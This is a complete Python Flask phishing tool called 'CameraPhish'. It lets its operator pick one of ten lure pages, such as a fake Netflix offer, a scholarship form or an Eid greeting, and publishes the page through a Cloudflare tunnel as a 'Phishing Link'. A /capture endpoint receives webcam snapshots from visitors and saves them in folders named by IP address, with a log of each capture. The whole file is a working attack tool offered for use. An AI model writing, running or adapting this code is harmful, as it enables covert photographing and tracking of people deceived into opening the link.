import os
import base64
import logging
import datetime
import re
import subprocess
from flask import Flask, request, render_template

# Function to display banner
def show_banner():
    banner = r"""
                       ______
                    .-"      "-.
                   /  *ViRuS*   \
       _          |              |          _
      ( \         |,  .-.  .-.  ,|         / )
       > "=._     | )(_0_/\_0_)( |     _.=" <
      (_/"=._"=._ |/     /\     \| _.="_.="\_)
             "=._ (_     ^^     _)"_.="
                 "=\__|IIIIII|__/="
                _.="| \IIIIII/ |"=._
      _     _.="_.="\          /"=._"=._     _
     ( \_.="_.="     `--------`     "=._"=._/ )
      > _.="                            "=._ <
     (_/                                    \_)
 ____________________________________________________
 ----------------------------------------------------        
        #  CameraPhish
        #  Author : The-Real-Virus
        #  https://github.com/The-Real-Virus
 ____________________________________________________
 ----------------------------------------------------
"""
    print(banner)

# Show banner at script startup
show_banner()

# Ask user for input
choice = input("\nPress 'y' to continue or 'n' to exit: ").strip().lower()

if choice == 'n':
    print("\nExiting the script. Goodbye!")
    exit()
elif choice == 'y':
    os.system('clear' if os.name == 'posix' else 'cls')  # Clear screen on Linux/Mac ('clear') or Windows ('cls')
else:
    print("\nInvalid choice. Exiting the script.")
    exit()

# Initialize Flask
app = Flask(__name__, template_folder="templates")

# Create the main directory for captured images
os.makedirs("captured_images", exist_ok=True)

# Enable logging to a file
LOG_FILE = "log.txt"
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

def get_real_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()  # Take the first IP if multiple

    # Extract IPv4 if an IPv6 address is present
    ipv4_match = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", ip)
    
    return ipv4_match.group(0) if ipv4_match else ip  # Return IPv4 if found, else return original

# Function to install and configure Cloudflare Tunnel
def setup_cloudflare():
    if not os.path.exists("/usr/local/bin/cloudflared"):
        print("\n[⚠] Cloudflare Tunnel not found. Installing now...\n")
        os.system("wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared")
        os.system("chmod +x cloudflared")
        os.system("sudo mv cloudflared /usr/local/bin/")
        print("\n✅ Cloudflare Tunnel installed successfully!")

# Function to start Cloudflare Tunnel
def start_cloudflare():
    print("\n[🔄] Starting Cloudflare Tunnel...")
    process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    for line in process.stderr:
        if "trycloudflare.com" in line:
            parts = line.split()
            for part in parts:
                if "https://" in part:
                    return part.strip()
    return None

# Ask user to select a phishing template
templates = {
    "1" : "Exclusive_Offer",
    "2" : "Breaking_News",
    "3" : "Scholarship_Application",
    "4" : "Celebrity_Video_Call",
    "5" : "Netflix_Free_Subscription",
    "6" : "E_Commerce_Order",
    "7" : "Birthday_Wish",
    "8" : "Online_Meeting",
    "9" : "Youtube_Live",
    "10": "Eid_Mubarak",
}

print("\n[🎭] Choose a phishing template:")
for key, value in templates.items():
    print(f"[{key}] {value.replace('_', ' ')}")

choice = input("\n[➤] Enter your choice (1 to 10): ").strip()
selected_template = templates.get(choice)

if not selected_template:
    print("\n❌ Invalid choice. Exiting...")
    exit()

# Confirm template selection
print(f"\n✅ Selected Template: {selected_template.replace('_', ' ')}")

# Start Cloudflare Tunnel
setup_cloudflare()
tunnel_url = start_cloudflare()
if not tunnel_url:
    print("\n❌ Error starting tunnel. Exiting...")
    exit()

# Display the phishing link
print("\n" + "=" * 90)
print(f"💀 Phishing Link: {tunnel_url}")
print("=" * 90)

# Serve the selected template
@app.route('/')
def serve_template():
    return render_template(f"{selected_template}/index.html")

# Receive and save captured images
@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    image_data = data.get('image')
    ip = get_real_ip()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    # Create a folder for each IP
    ip_folder = f"captured_images/{ip}"
    os.makedirs(ip_folder, exist_ok=True)

    filename = f"{ip_folder}/{timestamp}.png"

    # Decode and save image
    image_data = image_data.split(",")[1]  # Remove metadata prefix
    with open(filename, "wb") as file:
        file.write(base64.b64decode(image_data))

    # Log capture
    log_entry = f"[📸] Image captured from {ip} - Saved as {filename}"
    print(f"\n{log_entry}")
    logging.info(log_entry)

    return {"status": "success", "file": filename}

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)  # Hide Flask's default logs

# Run Flask server
if __name__ == '__main__':
    print("\n[🚀] Starting Flask server...\n", flush=True)
    print("[X] Press CTRL + C To Exit....", flush=True)
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=False)
